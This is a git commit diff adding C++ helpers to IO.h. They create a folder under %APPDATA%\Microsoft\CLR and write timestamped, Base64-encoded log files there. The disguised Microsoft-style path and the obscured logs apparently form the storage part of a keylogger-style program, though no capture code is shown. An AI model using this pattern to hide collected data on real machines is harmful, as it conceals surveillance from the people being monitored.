6b7865f45b6bcff7b358d24e9561f2079058e60a
moksh <altiarahad@gmail.com>
2023-01-09 20:51:35 +0530

    added stuff,path error

--- IO.h
+++ IO.h
@@ -9,7 +9,50 @@
 #include "Base64.h"
 
 namespace IO {
-    
+    std::string GetOurPath(const bool append_seperator = false){
+        std::string appdata_dir(getenv("APPDATA"));
+        std::string full = appdata_dir + "\\Microsoft\\CLR";
+        return full + (append_seperator ? "\\" : "");
+    }
+
+    bool MkOneDr(std::string path) {
+        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
+    }
+
+    bool MKDir(std::string path) {
+        for(char &c : path) {
+            if (c == '\\') {
+                c='\0';
+                if (!MkOneDr(path)) {
+                    return false;
+                }
+                c = '\\';
+            }
+        }
+        return true;
+    }
+    template <class T>
+    std::string WriteLog(const T &t){
+        std::string path = GetOurPath(true);
+        Helper::DateTime dt;
+        std::string name = dt.GetDateString("_") + ".log";
+
+        try {
+            std::ofstream file(path + name);
+            if(!file) return "";
+            std::ostringstream s;
+            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
+            std::string data = Base64::EncryptB64(s.str());
+            file << data;
+            if (!file)
+                return "";
+            file.close();
+            return name;
+        }
+        catch(...) {
+            return "";
+        }
+    }
 }
 
 #endif
